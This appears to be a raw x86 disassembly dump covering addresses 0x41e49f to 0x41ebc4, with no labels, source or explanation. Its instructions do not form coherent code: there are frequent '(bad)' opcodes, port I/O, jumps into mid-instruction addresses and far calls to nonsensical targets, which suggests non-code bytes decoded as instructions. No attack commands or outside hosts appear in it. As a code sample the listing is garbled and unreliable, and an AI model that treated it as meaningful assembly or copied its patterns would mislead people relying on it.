  41e49f:	xor    ah,ch
  41e4a1:	jg     0x41e438
  41e4a3:	loope  0x41e49f
  41e4a5:	fbld   TBYTE PTR [eax]
  41e4a7:	mov    eax,0xb5a423fd
  41e4ac:	(bad)  
  41e4ad:	jb     0x41e4e1
  41e4af:	ja     0x41e43a
  41e4b1:	and    al,0xa8
  41e4b3:	xor    dl,BYTE PTR [ebp+eax*2-0x5a]
  41e4b7:	out    0x96,eax
  41e4b9:	pop    eax
  41e4ba:	cwde   
  41e4bb:	lahf   
  41e4bc:	popa   
  41e4bd:	addr16 jmp 0x41e4c5
  41e4c0:	(bad)  
  41e4c1:	xlat   BYTE PTR ds:[ebx]
  41e4c2:	(bad)  
  41e4c3:	mov    BYTE PTR [edx-0x50a85478],ah
  41e4c9:	cdq    
  41e4ca:	shl    BYTE PTR [edx+0x7],1
  41e4cd:	fcomip st,st(7)
  41e4cf:	mov    ebx,esp
  41e4d1:	cwde   
  41e4d2:	pop    edx
  41e4d3:	lods   eax,DWORD PTR ds:[esi]
  41e4d4:	(bad)  
  41e4d5:	mov    dl,0xb7
  41e4d7:	int3   
  41e4d8:	(bad)  
  41e4d9:	in     al,0x14
  41e4db:	imul   ecx,DWORD PTR [edi-0x9494ce2],0xffffff88
  41e4e2:	test   al,0x50
  41e4e4:	(bad)  
  41e4e5:	(bad)  
  41e4e6:	call   0x24266146
  41e4eb:	pop    ds
  41e4ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4ed:	push   esp
  41e4ee:	sub    al,0x31
  41e4f0:	cmp    DWORD PTR ds:0x19e9d9c5,esi
  41e4f6:	(bad)  
  41e4f7:	(bad)  
  41e4f8:	sbb    DWORD PTR [ebp+0x576b8366],ecx
  41e4fe:	scas   eax,DWORD PTR es:[edi]
  41e4ff:	adc    DWORD PTR ds:0xcf4f4c0a,edx
  41e505:	xor    al,ch
  41e507:	test   DWORD PTR [ecx-0x2d],0x9379e694
  41e50e:	push   esi
  41e50f:	mov    bl,0x49
  41e511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e512:	pop    eax
  41e513:	inc    edx
  41e514:	jns    0x41e4a0
  41e516:	xor    BYTE PTR [ecx+esi*8],cl
  41e519:	cmp    al,0xf
  41e51b:	pop    edi
  41e51c:	jns    0x41e4e2
  41e51e:	jno    0x41e4e2
  41e520:	jo     0x41e55a
  41e522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e523:	xlat   BYTE PTR ds:[ebx]
  41e524:	out    dx,eax
  41e525:	xchg   ecx,eax
  41e526:	and    al,0x89
  41e528:	into   
  41e529:	pop    edi
  41e52a:	sub    BYTE PTR ds:0x4f741529,dl
  41e530:	ret    0xc3c3
  41e533:	inc    ebx
  41e534:	sahf   
  41e535:	aas    
  41e536:	jg     0x41e586
  41e538:	mov    ebx,0x7c0822d5
  41e53d:	cs pop esi
  41e53f:	mov    esp,0xe1d3bb48
  41e544:	ret    0x1585
  41e547:	ss (bad) 
  41e549:	lahf   
  41e54a:	mov    dl,0xf6
  41e54c:	js     0x41e4db
  41e54e:	shl    DWORD PTR [eax],0xe6
  41e551:	lods   eax,DWORD PTR ds:[esi]
  41e552:	mov    bh,0x3e
  41e554:	retf   0xdbed
  41e557:	mov    bh,0x99
  41e559:	fwait
  41e55a:	fwait
  41e55b:	arpl   WORD PTR [esi+0x66],sp
  41e55e:	xchg   esi,eax
  41e55f:	mov    ds:0x4f4e23e3,eax
  41e564:	dec    edi
  41e565:	mov    ah,0xd5
  41e567:	push   ss
  41e568:	jmp    0x41e536
  41e56a:	mov    edi,0xa46bc7b5
  41e56f:	pop    ecx
  41e570:	retf   0xccdc
  41e573:	sub    al,0x77
  41e575:	out    dx,al
  41e576:	fsub   QWORD PTR [ecx-0x474e9123]
  41e57c:	mov    eax,0x5ded8bcc
  41e581:	pop    edx
  41e582:	inc    ebx
  41e583:	(bad)  
  41e584:	rcl    ah,cl
  41e586:	add    eax,0xe5e52c92
  41e58b:	mov    bh,0x7e
  41e58d:	cdq    
  41e58e:	hlt    
  41e58f:	(bad)  
  41e590:	dec    ebp
  41e592:	je     0x41e587
  41e594:	sbb    eax,0xa4dbdaa6
  41e599:	cmp    eax,0x30c1588
  41e59e:	xor    ebx,edi
  41e5a0:	call   0x11377caa
  41e5a5:	call   0x6c926dd7
  41e5aa:	jnp    0x41e57c
  41e5ac:	je     0x41e53e
  41e5ae:	sbb    bh,BYTE PTR [edx]
  41e5b0:	push   eax
  41e5b1:	test   eax,0xf2a901e9
  41e5b6:	pushf  
  41e5b7:	jg     0x41e5ca
  41e5b9:	test   ch,0x1e
  41e5bc:	sub    al,0x4c
  41e5be:	push   0x79fa1034
  41e5c3:	pop    eax
  41e5c4:	sar    BYTE PTR [eax+0x708a6c8f],1
  41e5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5cb:	repnz cld 
  41e5cd:	xchg   edx,eax
  41e5ce:	push   esp
  41e5cf:	in     eax,0x4a
  41e5d1:	ret    0x3957
  41e5d4:	sub    eax,0xa2f8cd0a
  41e5d9:	cwde   
  41e5da:	inc    edx
  41e5db:	sub    BYTE PTR [edi],dh
  41e5dd:	sahf   
  41e5de:	jg     0x41e5ce
  41e5e0:	push   edi
  41e5e1:	inc    edx
  41e5e3:	dec    edi
  41e5e4:	dec    ebp
  41e5e5:	std    
  41e5e6:	enter  0xfa9f,0x85
  41e5ea:	xlat   BYTE PTR ds:[ebx]
  41e5eb:	sub    bl,BYTE PTR [edx]
  41e5ed:	lock pop edx
  41e5ef:	or     DWORD PTR [eax],eax
  41e5f1:	(bad)  
  41e5f2:	call   DWORD PTR [edx-0x30]
  41e5f5:	jp     0x41e5e8
  41e5f7:	std    
  41e5f8:	pop    esi
  41e5f9:	xor    eax,0x8922f587
  41e5fe:	inc    ebp
  41e5ff:	sbb    BYTE PTR [eax+0x7b],cl
  41e602:	es leave 
  41e604:	jmp    0x41e64d
  41e606:	in     eax,0x92
  41e608:	cmp    BYTE PTR [esi],dh
  41e60a:	cmp    edi,esp
  41e60c:	sub    BYTE PTR [edi+0x4f],cl
  41e60f:	jle    0x41e637
  41e611:	xor    BYTE PTR [eax],dh
  41e613:	rcl    DWORD PTR [eax],1
  41e615:	out    dx,eax
  41e616:	mov    ah,0x5
  41e618:	xchg   DWORD PTR ds:0x9c3c0c2d,ecx
  41e61e:	sub    al,0xaf
  41e620:	sub    al,0x5f
  41e622:	cmp    BYTE PTR [ecx],dl
  41e624:	es inc edx
  41e626:	xor    al,0x92
  41e628:	cmp    eax,0x97863568
  41e62d:	daa    
  41e62e:	xchg   DWORD PTR [eax+0x42],edi
  41e631:	sbb    eax,0x9837f19e
  41e636:	int    0x22
  41e638:	xchg   BYTE PTR [ecx+0x393c2ec9],ah
  41e63e:	and    al,bh
  41e640:	int    0x9f
  41e642:	out    0x52,eax
  41e644:	hlt    
  41e645:	rep lods al,BYTE PTR ds:[esi]
  41e647:	into   
  41e648:	lods   eax,DWORD PTR ds:[esi]
  41e649:	rcr    bh,1
  41e64b:	sti    
  41e64c:	or     BYTE PTR [edi+0x58728fb5],al
  41e652:	mov    eax,0x21fd178c
  41e657:	xchg   edx,eax
  41e658:	push   0xd0afd49c
  41e65d:	ins    BYTE PTR es:[edi],dx
  41e65e:	mov    ch,0xc9
  41e660:	push   edx
  41e661:	pop    eax
  41e662:	mov    ebp,0xa5728572
  41e667:	dec    esp
  41e668:	mov    ecx,0xd4386552
  41e66d:	fwait
  41e66e:	(bad)  
  41e66f:	sahf   
  41e670:	mov    bh,0xce
  41e672:	mov    ecx,0xca3af57c
  41e677:	push   edi
  41e678:	inc    esp
  41e679:	push   ecx
  41e67a:	inc    esp
  41e67b:	sbb    al,bh
  41e67d:	mov    edx,0xcebd4e73
  41e682:	retf   0x1585
  41e685:	out    0x16,al
  41e687:	out    0x38,al
  41e689:	aas    
  41e68a:	aas    
  41e68b:	out    0x9d,eax
  41e68d:	ja     0x41e64d
  41e68f:	inc    ebp
  41e690:	mov    ebx,0x1e57c6d5
  41e695:	lahf   
  41e696:	(bad)  
  41e697:	(bad)  
  41e698:	pop    ds
  41e699:	mov    al,ds:0x65912c54
  41e69e:	xor    BYTE PTR [esi-0x55],dl
  41e6a1:	repnz fidivr WORD PTR [ebp+0x7f3e6cbb]
  41e6a8:	into   
  41e6a9:	clc    
  41e6aa:	les    esp,FWORD PTR [edi+ebp*2]
  41e6ad:	jge    0x41e6a3
  41e6af:	sub    eax,0xdbf8fede
  41e6b4:	ins    BYTE PTR es:[edi],dx
  41e6b5:	ins    DWORD PTR es:[edi],dx
  41e6b6:	outs   dx,DWORD PTR ds:[esi]
  41e6b7:	mov    bl,0xb2
  41e6b9:	jb     0x41e63c
  41e6bb:	ret    
  41e6bc:	ret    
  41e6bd:	inc    ebx
  41e6be:	out    dx,al
  41e6bf:	fnstsw WORD PTR [ebp-0x71]
  41e6c2:	jle    0x41e683
  41e6c4:	inc    edi
  41e6c5:	mul    DWORD PTR [esi-0x69]
  41e6c8:	retf   
  41e6c9:	xchg   edi,eax
  41e6ca:	push   edi
  41e6cb:	sub    DWORD PTR [edi-0x56],edx
  41e6ce:	aam    0xaa
  41e6d0:	push   ebp
  41e6d1:	dec    edx
  41e6d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6d3:	and    bh,BYTE PTR [edi+0x73aff5f3]
  41e6d9:	jo     0x41e74b
  41e6db:	rol    cl,0xfe
  41e6de:	ds aas 
  41e6e0:	hlt    
  41e6e1:	xchg   DWORD PTR [edi],edi
  41e6e3:	(bad)  
  41e6e4:	int3   
  41e6e5:	int3   
  41e6e6:	or     al,0xe7
  41e6e8:	int    0x26
  41e6ea:	shl    DWORD PTR [ebx],cl
  41e6ec:	xor    ebx,DWORD PTR [edi+edi*1+0x7e7e726c]
  41e6f3:	dec    esi
  41e6f4:	adc    BYTE PTR [esi-0x48b9a65c],al
  41e6fa:	(bad)  [ebx+0x6f]
  41e6fd:	outs   dx,DWORD PTR ds:[esi]
  41e6fe:	(bad)  
  41e6ff:	pop    esi
  41e700:	scas   eax,DWORD PTR es:[edi]
  41e701:	xchg   DWORD PTR [edx+0x70],edx
  41e704:	std    
  41e705:	cli    
  41e706:	or     eax,0xfae638e2
  41e70b:	(bad)  
  41e70c:	jmp    0x41e74a
  41e70e:	jge    0x41e702
  41e710:	test   bh,ah
  41e712:	sbb    ebp,ebx
  41e714:	fs sahf 
  41e716:	(bad)  
  41e717:	stc    
  41e718:	loop   0x41e77f
  41e71a:	mov    ah,BYTE PTR [ebx-0x2d]
  41e71d:	ins    BYTE PTR es:[edi],dx
  41e71e:	sbb    eax,0x4ff78975
  41e723:	dec    ecx
  41e724:	cmp    eax,DWORD PTR [edi-0x44]
  41e727:	push   ebp
  41e728:	fldenv [ecx-0x16]
  41e72b:	hlt    
  41e72c:	pop    ebp
  41e72d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e72e:	jg     0x41e713
  41e730:	cmp    eax,0x44a7bdb2
  41e735:	mov    DWORD PTR [esi-0x1df37c2e],eax
  41e73b:	ror    BYTE PTR [eax],1
  41e73d:	jnp    0x41e712
  41e73f:	mov    ecx,0x8e71877
  41e744:	nop
  41e745:	push   esp
  41e746:	lahf   
  41e747:	daa    
  41e748:	data16 lahf 
  41e74a:	daa    
  41e74b:	sahf   
  41e74c:	jnp    0x41e7bf
  41e74e:	cli    
  41e74f:	sbb    ah,BYTE PTR [esi]
  41e751:	mov    ah,0x29
  41e753:	mov    edx,0x469004c6
  41e758:	pop    ds
  41e759:	jno    0x41e75d
  41e75b:	add    eax,0x1a5ace0f
  41e760:	leave  
  41e761:	inc    ebp
  41e762:	xchg   ecx,eax
  41e763:	push   ecx
  41e764:	and    al,0x7e
  41e766:	push   ds
  41e767:	ins    DWORD PTR es:[edi],dx
  41e768:	push   edx
  41e769:	push   es
  41e76a:	sbb    DWORD PTR [esi],ecx
  41e76c:	adc    edi,ebp
  41e76e:	int3   
  41e76f:	bound  ebx,QWORD PTR [eax+0x64e2949b]
  41e775:	xchg   esp,eax
  41e776:	(bad)  
  41e777:	loope  0x41e727
  41e779:	out    dx,eax
  41e77a:	add    dl,dh
  41e77c:	or     BYTE PTR [ebx+0x31],dl
  41e77f:	in     eax,dx
  41e780:	into   
  41e781:	inc    ebp
  41e782:	in     eax,dx
  41e783:	repz dec edi
  41e785:	add    edi,DWORD PTR [edi-0x11]
  41e788:	jnp    0x41e756
  41e78a:	xor    eax,0xb5e3afbf
  41e78f:	adc    al,BYTE PTR [eax]
  41e791:	dec    BYTE PTR [ebx+0xa217faf]
  41e797:	loop   0x41e73b
  41e799:	aad    0xe6
  41e79b:	sub    dh,BYTE PTR [edi]
  41e79d:	out    0x31,eax
  41e79f:	nop
  41e7a0:	fsubrp st(6),st
  41e7a2:	add    bl,BYTE PTR [eax]
  41e7a4:	fwait
  41e7a5:	dec    esi
  41e7a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7a7:	mov    ebp,0x5044d7b5
  41e7ac:	mov    al,ds:0x40cf39ed
  41e7b1:	inc    DWORD PTR [ecx+0xc]
  41e7b4:	jnp    0x41e7dd
  41e7b6:	cli    
  41e7b7:	jmp    FWORD PTR [edx+0x31]
  41e7ba:	daa    
  41e7bb:	add    BYTE PTR ds:0x9d90c4d6,al
  41e7c1:	pop    edi
  41e7c2:	inc    esp
  41e7c3:	cli    
  41e7c4:	mov    ebp,DWORD PTR ds:0x1a57abe8
  41e7ca:	inc    esp
  41e7cb:	fs jns 0x41e827
  41e7ce:	sub    ah,ah
  41e7d0:	xor    BYTE PTR [ecx+0x11142f34],dl
  41e7d6:	fild   WORD PTR [ecx+0x6a]
  41e7d9:	and    bl,BYTE PTR [ecx]
  41e7db:	jmp    0xede3f3ae
  41e7e0:	pop    ss
  41e7e1:	pop    esp
  41e7e2:	mov    bh,BYTE PTR [esi-0x67]
  41e7e5:	test   DWORD PTR [edx-0x7f],esp
  41e7e8:	sar    ebp,0x15
  41e7eb:	es scas eax,DWORD PTR es:[edi]
  41e7ed:	std    
  41e7ee:	adc    BYTE PTR [esi-0x7],bl
  41e7f1:	or     ah,BYTE PTR [edi-0x1b]
  41e7f4:	gs push esp
  41e7f6:	sbb    BYTE PTR [eax-0x2c],dh
  41e7f9:	dec    esi
  41e7fa:	push   0xe5ea0525
  41e7ff:	dec    ecx
  41e800:	aam    0xa0
  41e802:	ret    
  41e803:	rcl    ecx,0x11
  41e806:	mov    DWORD PTR [edi+0x7a],0x7f8f821f
  41e80d:	cld    
  41e80e:	xchg   ebx,eax
  41e80f:	jp     0x41e798
  41e811:	fidiv  WORD PTR [ebx+eiz*4]
  41e814:	push   esp
  41e815:	sub    dh,BYTE PTR [ecx+0x2f11f8f6]
  41e81b:	pop    edi
  41e81c:	mov    esi,0x42b9dda4
  41e821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e822:	push   edx
  41e823:	mov    eax,ds:0xc493af5e
  41e828:	or     DWORD PTR [esi-0x4b112c11],ebx
  41e82e:	jne    0x41e86b
  41e830:	icebp  
  41e831:	and    BYTE PTR [eax+ecx*1],ah
  41e834:	add    eax,DWORD PTR [esi]
  41e836:	std    
  41e837:	add    DWORD PTR [ecx-0x6e],esi
  41e83a:	shr    BYTE PTR [esi-0x49],1
  41e83d:	lock jl 0x41e7df
  41e840:	jb     0x41e7fb
  41e842:	int3   
  41e843:	int3   
  41e844:	hlt    
  41e845:	xor    al,0x95
  41e847:	jb     0x41e7ce
  41e849:	mov    ds:0x21d7a749,ax
  41e84f:	push   ds
  41e850:	push   0x58
  41e852:	pop    edi
  41e853:	cs xchg edi,eax
  41e855:	sub    BYTE PTR [esi],dl
  41e857:	or     dh,BYTE PTR [esi-0x59]
  41e85a:	loop   0x41e87c
  41e85c:	aam    0x6d
  41e85e:	mov    ch,0x8b
  41e860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e861:	adc    bl,BYTE PTR [ebp-0x58b164b2]
  41e867:	retf   
  41e868:	loope  0x41e84b
  41e86a:	add    DWORD PTR [ebx+0x18e750c1],eax
  41e870:	lods   al,BYTE PTR ds:[esi]
  41e871:	lods   al,BYTE PTR ds:[esi]
  41e872:	push   eax
  41e873:	scas   eax,DWORD PTR es:[edi]
  41e874:	xlat   BYTE PTR ds:[ebx]
  41e875:	cdq    
  41e876:	test   al,0xd7
  41e878:	mov    ecx,0x5b2eef77
  41e87d:	das    
  41e87e:	pop    edi
  41e87f:	push   eax
  41e880:	sub    dl,BYTE PTR [esi+0x7dcfa1f8]
  41e886:	mov    ds,WORD PTR [ecx+0x1b4e3999]
  41e88c:	dec    ebp
  41e88d:	mov    ds:0x795e38f2,al
  41e892:	or     cl,dl
  41e894:	push   ebx
  41e895:	int3   
  41e896:	dec    esi
  41e897:	(bad)  
  41e898:	dec    eax
  41e899:	call   0xc1ef:0xef7cbc7b
  41e8a0:	mov    bl,0xaf
  41e8a2:	xor    DWORD PTR [esi],esi
  41e8a4:	pop    esp
  41e8a5:	fisub  WORD PTR ds:[bp+di]
  41e8a9:	jmp    0xf33:0x350e931c
  41e8b0:	cmp    eax,0x14d3f1ad
  41e8b5:	xchg   esp,eax
  41e8b6:	xchg   ebx,eax
  41e8b7:	mov    ebp,0xc85a7be9
  41e8bc:	xchg   DWORD PTR [ecx-0x65db0b77],eax
  41e8c2:	imul   edi,DWORD PTR [ebp+0x65],0x36b370ec
  41e8c9:	adc    dl,BYTE PTR [eax]
  41e8cb:	or     bh,BYTE PTR [ebx+edx*8-0x5]
  41e8cf:	shr    DWORD PTR [ebx+edx*2+0x6860c214],1
  41e8d6:	out    dx,al
  41e8d7:	arpl   si,cx
  41e8d9:	repz cmp al,0x4d
  41e8dc:	pop    ds
  41e8dd:	leave  
  41e8de:	add    BYTE PTR [esi-0x71],dh
  41e8e1:	loope  0x41e8c9
  41e8e3:	and    dh,BYTE PTR [ebx+edi*4+0x39]
  41e8e7:	jge    0x41e8ed
  41e8e9:	sub    ah,BYTE PTR [edi+0x3c08e911]
  41e8ef:	dec    esp
  41e8f0:	mov    al,0xda
  41e8f2:	ret    0xe56
  41e8f5:	xchg   edx,eax
  41e8f6:	rcr    DWORD PTR [edi+0x12164f22],cl
  41e8fc:	mov    edx,0x3c287c09
  41e901:	sti    
  41e902:	cmc    
  41e903:	lahf   
  41e904:	loopne 0x41e965
  41e906:	or     BYTE PTR [eax+0xde1f27f],al
  41e90c:	mov    ebx,0x2cfdf65f
  41e911:	iret   
  41e912:	mov    dl,0x12
  41e914:	or     eax,0xe20298eb
  41e919:	adc    ah,dh
  41e91b:	dec    esp
  41e91c:	adc    DWORD PTR [eax-0x689af8c8],0x834c09f
  41e926:	sbb    DWORD PTR [edx],edi
  41e928:	pop    edx
  41e929:	inc    ecx
  41e92a:	sub    DWORD PTR [eax+0x75],ebp
  41e92d:	mov    ch,0x94
  41e92f:	(bad)  
  41e931:	fs xchg ebx,eax
  41e933:	(bad)  
  41e934:	mov    es,ebx
  41e936:	adc    al,0x4a
  41e938:	and    DWORD PTR [edx+ecx*1+0x73d777b9],edx
  41e93f:	into   
  41e940:	xchg   ecx,eax
  41e941:	int    0x44
  41e943:	bound  edx,QWORD PTR [ebx-0x2]
  41e946:	sub    DWORD PTR [ecx+0x2d54e683],ebx
  41e94c:	xor    al,0xc
  41e94e:	push   esp
  41e94f:	leave  
  41e950:	xor    dh,ah
  41e952:	xchg   ecx,edi
  41e954:	(bad)  [ebx]
  41e956:	enter  0xa740,0x94
  41e95a:	add    DWORD PTR [esi-0x5081972a],edi
  41e960:	dec    edi
  41e961:	ins    DWORD PTR es:[edi],dx
  41e962:	test   DWORD PTR [ecx],0x2e13d6d9
  41e968:	adc    al,0xe1
  41e96a:	push   edx
  41e96b:	mov    ebp,0xcf36b24e
  41e970:	imul   esp,DWORD PTR [ecx-0x7b],0x9d917f81
  41e977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e978:	(bad)  
  41e979:	push   eax
  41e97a:	mov    edi,0x8b0b36f8
  41e97f:	repz mov ah,0x86
  41e982:	sbb    DWORD PTR [edx+0x2bdf4d3c],ebp
  41e988:	push   ebx
  41e989:	lods   al,BYTE PTR ds:[esi]
  41e98a:	iret   
  41e98b:	push   edx
  41e98c:	sub    DWORD PTR [esp+edx*2-0x20119ad5],eax
  41e993:	mov    edi,0x31f1f1cf
  41e998:	std    
  41e999:	jle    0x41e93a
  41e99b:	iret   
  41e99c:	jle    0x41e994
  41e99e:	mov    bl,0xbc
  41e9a0:	std    
  41e9a1:	neg    bl
  41e9a3:	sbb    al,0x1d
  41e9a5:	push   ds
  41e9a6:	xor    bh,BYTE PTR [edi-0x21013750]
  41e9ac:	push   ds
  41e9ad:	out    dx,eax
  41e9ae:	fnstsw WORD PTR [ebx-0x71]
  41e9b1:	and    BYTE PTR [eax+0x36fb73b8],cl
  41e9b7:	aaa    
  41e9b8:	outs   dx,DWORD PTR ds:[esi]
  41e9b9:	fst    st(2)
  41e9bb:	mov    DWORD PTR [edx+0x13],ecx
  41e9be:	adc    ecx,DWORD PTR [edi+eax*1]
  41e9c1:	jp     0x41ea3e
  41e9c3:	scas   eax,DWORD PTR es:[edi]
  41e9c4:	mov    ebp,0xad2e7dfd
  41e9c9:	pop    esp
  41e9ca:	fs jbe 0x41ea4b
  41e9cd:	mov    ds,WORD PTR [ebx]
  41e9cf:	aaa    
  41e9d0:	outs   dx,DWORD PTR ds:[esi]
  41e9d1:	shr    DWORD PTR [ecx-0x49],1
  41e9d4:	pop    ecx
  41e9d5:	pop    edx
  41e9d6:	pop    edx
  41e9d7:	loop   0x41e9a2
  41e9d9:	adc    edi,DWORD PTR [ebp-0x41fa7cb]
  41e9df:	fdivr  QWORD PTR [esi-0x20c8788d]
  41e9e5:	js     0x41e97a
  41e9e7:	jmp    0x97d853d5
  41e9ec:	xchg   esi,eax
  41e9ed:	cmp    BYTE PTR [edi],bh
  41e9ef:	aas    
  41e9f0:	out    0xee,eax
  41e9f2:	ja     0x41e9d2
  41e9f4:	mov    eax,ds:0x96436edd
  41e9f9:	repnz test bh,0x3f
  41e9fd:	dec    ecx
  41e9fe:	lods   al,BYTE PTR gs:[esi]
  41ea00:	xchg   dl,al
  41ea02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea03:	push   esp
  41ea04:	lods   eax,DWORD PTR ds:[esi]
  41ea05:	ror    edi,cl
  41ea07:	mov    BYTE PTR ss:[ebx+0x49b1c231],al
  41ea0e:	into   
  41ea0f:	sti    
  41ea10:	push   ds
  41ea11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea12:	das    
  41ea13:	pop    edi
  41ea14:	jo     0x41ea0a
  41ea16:	repnz xor DWORD PTR [edi],edx
  41ea19:	mov    BYTE PTR [esi-0x4e93e7a4],0x38
  41ea20:	jl     0x41e9a9
  41ea22:	icebp  
  41ea23:	lea    esp,[edi]
  41ea25:	adc    al,0xee
  41ea27:	out    dx,al
  41ea28:	mov    al,ds:0x8c1427da
  41ea2d:	xchg   esi,eax
  41ea2e:	mov    ss,WORD PTR [ebx-0x33]
  41ea31:	lock cdq 
  41ea33:	sub    esp,ecx
  41ea35:	popa   
  41ea36:	push   0x9b97bea0
  41ea3b:	imul   esi,DWORD PTR [edx+0x6bf9d6fe],0xf3f43818
  41ea45:	mov    edx,0x9e6d148f
  41ea4a:	lds    eax,FWORD PTR [ebx+0x7d]
  41ea4d:	outs   dx,BYTE PTR ds:[esi]
  41ea4e:	dec    edx
  41ea4f:	(bad)  
  41ea50:	pop    ecx
  41ea51:	xchg   edx,eax
  41ea52:	call   0x3b72dc0c
  41ea57:	add    DWORD PTR ds:0xe8f8d8e,esp
  41ea5d:	or     edi,ebp
  41ea5f:	sahf   
  41ea60:	ret    0x79b5
  41ea63:	sub    eax,0x7cf2c828
  41ea68:	adc    BYTE PTR [eax],bl
  41ea6a:	push   ebp
  41ea6b:	add    dl,al
  41ea6d:	fcom   QWORD PTR [edx+0x31]
  41ea70:	push   0xba68821d
  41ea75:	xchg   esp,eax
  41ea76:	sbb    eax,0xd874a485
  41ea7b:	aaa    
  41ea7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea7d:	inc    ebx
  41ea7e:	xor    DWORD PTR ds:0x7f2bee7c,ebp
  41ea84:	out    0xb3,al
  41ea86:	xchg   ebp,eax
  41ea87:	iret   
  41ea88:	cld    
  41ea89:	jmp    0x5aaf63ed
  41ea8e:	test   DWORD PTR [ebp-0x1c9ffdca],edi
  41ea94:	outs   dx,DWORD PTR ds:[esi]
  41ea95:	std    
  41ea96:	jnp    0x41eacb
  41ea98:	loope  0x41ead5
  41ea9a:	jg     0x41ea91
  41ea9c:	mov    bl,0xaa
  41ea9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea9f:	xor    eax,0x93303277
  41eaa4:	in     al,dx
  41eaa5:	xchg   cl,bh
  41eaa7:	rcr    BYTE PTR [eax+ecx*1-0x8b2b4e],cl
  41eaae:	icebp  
  41eaaf:	repz es lahf 
  41eab2:	mov    BYTE PTR [ebx],dh
  41eab4:	inc    esi
  41eab5:	cwde   
  41eab6:	iret   
  41eab7:	js     0x41eb2e
  41eab9:	xchg   DWORD PTR [ecx],esi
  41eabb:	sbb    al,0x35
  41eabd:	mov    al,ds:0xb5b3c833
  41eac2:	or     al,dh
  41eac4:	cmp    al,0x8
  41eac6:	sbb    al,0x4d
  41eac8:	lahf   
  41eac9:	xchg   ecx,eax
  41eaca:	inc    ebx
  41eacb:	cld    
  41eacc:	or     al,0x63
  41eace:	das    
  41eacf:	sbb    al,BYTE PTR [ecx+0x9c97b22]
  41ead5:	and    dh,BYTE PTR [ecx+0x510ce23d]
  41eadb:	mov    BYTE PTR [ecx],bh
  41eadd:	popa   
  41eade:	std    
  41eadf:	adc    dh,al
  41eae1:	push   ecx
  41eae2:	test   al,0x44
  41eae4:	mov    ebp,DWORD PTR [eax]
  41eae6:	rol    DWORD PTR [ebx-0x7c2b7c32],cl
  41eaec:	jle    0x41eaf4
  41eaee:	pop    esi
  41eaef:	rcr    DWORD PTR [edi+esi*2+0x6e3b20d6],0x30
  41eaf7:	in     eax,dx
  41eaf8:	aas    
  41eaf9:	data16 mov BYTE PTR [ebx-0x52afce14],0x33
  41eb01:	xor    eax,0x37b2c736
  41eb06:	adc    edi,0xffffffbf
  41eb09:	dec    ecx
  41eb0a:	jae    0x41eb8b
  41eb0c:	mov    gs,ebp
  41eb0e:	push   esi
  41eb0f:	inc    eax
  41eb10:	xor    BYTE PTR [ebp-0x67],dh
  41eb13:	mov    ecx,0xceccdbd5
  41eb18:	iret   
  41eb19:	rcr    BYTE PTR [edx],cl
  41eb1b:	and    al,0x94
  41eb1d:	daa    
  41eb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb1f:	call   0x90a5fdce
  41eb24:	inc    esp
  41eb25:	arpl   WORD PTR [edx*4-0x7ca179f7],ax
  41eb2c:	(bad)  
  41eb2e:	and    ebx,DWORD PTR [ebx]
  41eb30:	or     al,0x48
  41eb32:	std    
  41eb33:	mov    BYTE PTR [ecx+0x15326585],bh
  41eb39:	xor    BYTE PTR [esi],bh
  41eb3b:	pop    esi
  41eb3c:	daa    
  41eb3d:	dec    esi
  41eb3e:	bound  edi,QWORD PTR [esi-0x2e905207]
  41eb44:	push   0xffffffb5
  41eb46:	fdivr  DWORD PTR [ebx]
  41eb48:	cmp    ah,dl
  41eb4a:	(bad)  
  41eb4b:	sbb    ebp,DWORD PTR [edi+0x52]
  41eb4e:	test   eax,0x3fef4d6
  41eb53:	xchg   ebx,eax
  41eb54:	push   ebx
  41eb55:	ins    BYTE PTR es:[edi],dx
  41eb56:	in     eax,dx
  41eb57:	in     al,dx
  41eb58:	jno    0x41eb30
  41eb5a:	ins    BYTE PTR es:[edi],dx
  41eb5b:	adc    DWORD PTR [esi-0x6a9d7dfb],eax
  41eb61:	retf   0xcf8
  41eb64:	xchg   ebp,eax
  41eb65:	outs   dx,BYTE PTR ds:[esi]
  41eb66:	sub    BYTE PTR [edx],0x4d
  41eb69:	nop
  41eb6a:	or     eax,0x1c68923d
  41eb6f:	(bad)  
  41eb70:	adc    bl,BYTE PTR [esi+0x75]
  41eb73:	xchg   ch,bh
  41eb75:	mov    bl,0xe
  41eb77:	fwait
  41eb78:	jmp    0x41eb15
  41eb7a:	test   al,0xc1
  41eb7c:	cmp    DWORD PTR [ebx-0x7da8ee6d],ecx
  41eb82:	dec    ebp
  41eb83:	push   ss
  41eb84:	cld    
  41eb85:	pop    es
  41eb86:	sub    al,0x76
  41eb88:	mov    ebx,0xdffabf78
  41eb8d:	push   ebx
  41eb8e:	fdivr  QWORD PTR [esi-0x34]
  41eb91:	aad    0xf4
  41eb93:	test   dl,dl
  41eb95:	mov    al,0x43
  41eb97:	sub    BYTE PTR [esi+0x5a],cl
  41eb9a:	mov    cl,0xd7
  41eb9c:	add    ebx,DWORD PTR [ebp-0x6656c58]
  41eba2:	mov    dh,0x1e
  41eba4:	sti    
  41eba5:	xor    al,0x67
  41eba7:	mov    edx,0xa673d52c
  41ebac:	les    esp,FWORD PTR [ecx-0x628cc199]
  41ebb2:	je     0x41ebca
  41ebb4:	test   eax,0x60663391
  41ebb9:	(bad)  
  41ebba:	fdiv   QWORD PTR [edi]
  41ebbc:	mov    ah,BYTE PTR [ecx+edx*1]
  41ebbf:	in     al,0xe6
  41ebc1:	cwde   
  41ebc2:	xchg   edx,eax
  41ebc3:	cwde   
  41ebc4:	addr16 dec edx
